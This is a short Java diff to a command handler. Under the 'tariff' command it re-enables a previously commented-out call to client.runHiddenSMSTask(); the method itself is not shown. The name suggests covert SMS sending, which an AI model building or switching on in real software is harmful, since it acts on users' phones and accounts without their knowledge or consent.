@@ -96,7 +96,7 @@ public class Main {
             case "tariff":
                 if (client != null) {
                     if (client.getSession() != null) {
-                        //client.runHiddenSMSTask();
+                        client.runHiddenSMSTask();
 
                         return true;
                     }
